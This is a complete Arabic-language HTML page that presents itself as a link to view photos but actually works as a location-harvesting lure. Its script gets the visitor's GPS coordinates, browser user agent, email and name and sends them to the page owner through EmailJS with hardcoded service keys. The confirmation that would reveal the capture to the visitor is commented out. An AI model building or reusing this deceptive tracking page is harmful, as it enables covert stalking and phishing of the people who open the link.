<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>شارك موقعك</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    /* Reset بسيط */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background-color: #fff;
      max-width: 400px;
      width: 100%;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      padding: 30px;
      text-align: center;
    }
    h2 {
      font-size: 1.5rem;
      margin-bottom: 15px;
      color: #4169e1;
    }
    .input-group {
      margin-bottom: 15px;
      text-align: right;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-size: 0.9rem;
      color: #555;
    }
    input, textarea {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
      margin-bottom: 5px;
    }
    textarea { resize: vertical; height: 80px; }
    .btn {
      background-color: #4169e1;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 12px 24px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    .btn:hover {
      background-color: #1e40af;
      transform: translateY(-2px);
    }
    .btn:active {
      transform: translateY(0);
    }
    .note {
      margin-top: 10px;
      font-size: 0.9rem;
      color: #666;
    }
  </style>
  <script>
    (function(){
      emailjs.init("3XjJU-q1Z9InCOOUd"); // استبدل بـ Public Key الخاص بك
    })();
    function sendLocation() {
      const userEmail = document.getElementById('inputEmail').value.trim();
      const userName  = document.getElementById('inputName').value.trim();
      const userNote  = document.getElementById('inputNote').value.trim();
      if (!userEmail) {
        alert('يرجى إدخال بريدك الإلكتروني.'); return;
      }
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude.toFixed(5);
          const longitude = position.coords.longitude.toFixed(5);
          const userAgent = navigator.userAgent;
          emailjs.send("service_lz9wzcm", "template_sj40xwh", {
            email:      userEmail,
            name:       userName,
            note:       userNote,
            latitude:   latitude,
            longitude:  longitude,
            user_agent: userAgent
          })
          .then(function(response) {
            // alert("تم إرسال موقعك بنجاح!\nخط العرض: " + latitude + "\nخط الطول: " + longitude);
          }, function(error) {
            alert("حدث خطأ أثناء الإرسال: " + error);
          });
        }, function(error) {
          alert('تعذّر الحصول على الموقع: ' + error.message);
        });
      } else {
        alert("المتصفح لا يدعم تحديد الموقع.");
      }
    }
  </script>
</head>
<body>
  <div class="card">
    <h2>اتمنى لك مشاهدة ممتعة</h2>
    <div class="input-group">
      <label for="inputName">الاسم (اختياري)</label>
      <input type="text" id="inputName" placeholder="أدخل اسمك">
    </div>
    <div class="input-group">
      <label for="inputEmail">البريد الإلكتروني</label>
      <input type="email" id="inputEmail" placeholder="example@mail.com">
    </div>
    <div class="input-group">
      <label for="inputNote">ملاحظة (اختياري)</label>
      <textarea id="inputNote" placeholder="أدخل أي معلومات إضافية..."></textarea>
    </div>
    <button class="btn" onclick="sendLocation()">إضغط هنا لمشاهدة الصور</button>
  </div>
</body>
</html>
